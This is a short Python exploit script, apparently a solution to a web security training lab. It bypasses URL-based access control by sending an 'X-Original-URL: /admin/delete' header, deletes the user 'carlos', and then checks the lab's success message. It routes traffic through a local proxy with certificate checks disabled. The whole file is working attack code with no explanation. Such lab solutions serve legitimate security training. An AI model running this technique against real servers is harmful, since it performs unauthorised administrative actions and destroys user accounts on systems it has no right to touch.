import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def delete_user(s, url):

    delete_carlos_user_url = url + "/?username=carlos"
    headers = {"X-Original-URL": "/admin/delete"}
    r = s.get(delete_carlos_user_url, headers=headers, proxies=proxies, verify=False)

    # verify if the user was deleted
    r = s.get(url, verify=False, proxies=proxies)
    res = r.text
    if "Congratulations, you solved the lab!" in res:
        print("(+) User 'carlos' deleted successfully.")
    else:
        print("(-) Failed to delete user 'carlos'. Status code: %d" % r.status_code)
        print("(-) Exiting the script.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <URL>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    print("(+) Deleting user 'carlos'...")
    delete_user(s, url)

if __name__ == "__main__":
    main()